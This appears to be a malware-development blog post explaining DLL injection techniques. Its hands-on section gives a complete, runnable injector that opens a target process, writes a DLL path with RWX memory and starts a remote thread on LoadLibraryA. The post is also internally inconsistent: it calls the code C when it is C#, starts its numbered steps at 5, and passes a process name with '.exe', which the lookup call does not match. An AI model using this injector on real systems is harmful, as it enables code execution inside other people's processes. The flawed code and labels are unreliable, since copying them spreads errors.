---
layout: single
title: "Payload Unleashed: DLL Injection"
date: 2024-02-28
classes: wide
header:
  teaser: /assets/images/maldev.png
categories:
  - infosec
tags:
  - windows
  - malware
---

Dynamic Link Library (DLL) injection is a technique used in the realm of software development and cybersecurity. It involves inserting a DLL into the address space of a running process, thereby altering its behavior or extending its functionality. While primarily used for legitimate purposes such as debugging and system monitoring, DLL injection can also be leveraged for malicious activities like code execution and privilege escalation. 

In this blog post, we'll delve into the workings of DLL injection, its various types, and which nasty things can we do with it.

# Understanding DLL Injection

At its core, DLL injection is about injecting external code into the memory space of a running process. This allows the injected code to execute within the context of the target process, granting it access to resources and functionalities it wouldn't normally have. The injection process typically involves the following steps:

1. **Selection of Target Process**: The first step is to identify the process into which the DLL will be injected. This could be any running application or system process.
    
2. **Loading the DLL**: The DLL to be injected is loaded into the memory space of the target process. This can be achieved through various means, including using APIs like LoadLibrary or manually mapping the DLL into memory. We will address this techniques later. 
    
3. **Injection**: Once the DLL is loaded into the target process, the next step is to execute its code within that process. This is often achieved by creating a remote thread within the target process and directing it to execute a specific function within the injected DLL.

# Types of DLL Injection

DLL injection techniques can be classified into several categories, each with its own advantages and use cases. Some common types include:

1. **Load-time Injection**: In load-time injection, the DLL is loaded into the target process's address space at the time of process creation. This can be achieved by specifying the DLL in the process's import table or by modifying the process's environment variables to include the DLL's path.
    
2. **Run-time Injection**: Run-time injection involves injecting the DLL into a running process. This can be done using APIs like CreateRemoteThread or by directly modifying the target process's memory space to load the DLL.
    
3. **Reflective Injection**: Reflective injection is a more advanced technique where the injected DLL is capable of loading and executing itself without relying on the traditional Windows DLL loading mechanisms. This makes it harder to detect and trace compared to other injection methods. 
    
4. **Code Injection**: In code injection, rather than injecting an entire DLL, small snippets of code are injected into the target process. This code is then executed within the context of the process, allowing for more granular control over its behavior.

# Hands-On: Implementing DLL Injection in C

In this hands-on section, we'll explore how to implement DLL injection using C code. We'll focus on run-time injection, which involves injecting a DLL into a running process. For this demonstration, we'll create a simple console application to perform the injection.

## Overall process

 First, we need to open a handle to the target process to enable access to its memory space. Then, we reserve space within the target process to store the path of the DLL to be injected. Subsequently, the DLL path is written into this allocated memory space. Finally, a new thread is created within the target process, with its execution directed to a function that loads the DLL into the process's memory space. As a result, the injected DLL becomes part of the target process's execution, enabling it to modify the process's behavior or extend its functionality as desired. In the following section we will see which C functions do we need to perform such tasks. 

##  Kernel32.dll functions

- **OpenProcess()**: This function is used to obtain a handle to the target process, which is required for various operations such as reading and writing memory or creating remote threads within the target process.

- **GetModuleHandle()**: It retrieves a handle to the specified module within the calling process. In this case, it's used to get a handle to the kernel32.dll module to obtain the address of the LoadLibraryA function.

- **GetProcAddress()**: This function retrieves the address of an exported function or variable from a specified dynamic-link library (DLL) module. Here, it's used to get the address of the LoadLibraryA function within the kernel32.dll module.

- **VirtualAllocEx()**: It is used to reserve or commit a region of memory within the virtual address space of the target process. In this code, it allocates memory within the target process to store the path of the DLL to be injected.

- **WriteProcessMemory()**: This function writes data to an area of memory in a specified process. Here, it writes the path of the DLL to be injected into the allocated memory space within the target process.

- **CreateRemoteThread()**: This function creates a new thread in the address space of the target process, starting execution at the specified address. In this code, it creates a remote thread within the target process to execute the LoadLibraryA function, effectively loading the DLL into the target process.


```c
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DLLInjectionDemo
{
    class Program
    {
        // Import necessary Win32 API functions
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            string targetProcessName = "targetProcess.exe"; // Change this to the name of the target process

            // Find the target process by name
            Process[] processes = Process.GetProcessesByName(targetProcessName);
            if (processes.Length == 0)
            {
                Console.WriteLine("Target process not found.");
                return;
            }

            Process targetProcess = processes[0];

            // Get the handle of the target process
            IntPtr processHandle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open target process.");
                return;
            }

            // Load the DLL into memory
            string dllPath = "C:\\path\\to\\your\\injected.dll"; // Change this to the path of your DLL
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr allocMemAddr = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x1000, 0x40);

            // Write the DLL path into the target process's memory
            UIntPtr bytesWritten;
            WriteProcessMemory(processHandle, allocMemAddr, System.Text.Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

            // Create a remote thread in the target process to load the DLL
            CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddr, 0, IntPtr.Zero);

            Console.WriteLine("DLL injected successfully.");

            // Close the handle to the target process
            CloseHandle(processHandle);
        }

        // Import CloseHandle function
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}
```

Replace `"targetProcess.exe"` with the name of the target process you want to inject the DLL into, and `"C:\\path\\to\\your\\injected.dll"` with the path to the DLL you want to inject.

5. Build the project to ensure there are no compilation errors.
6. Run the console application. If the target process is found and the DLL injection is successful, you should see the message "DLL injected successfully."

Note: Make sure to test the DLL injection code responsibly and only on processes you have permission to interact with. Unauthorized DLL injection into system processes or third-party applications can lead to system instability or security vulnerabilities.

This hands-on example demonstrates the basics of DLL injection in C# using the Windows API functions. Further customization and error handling can be added based on specific requirements and scenarios.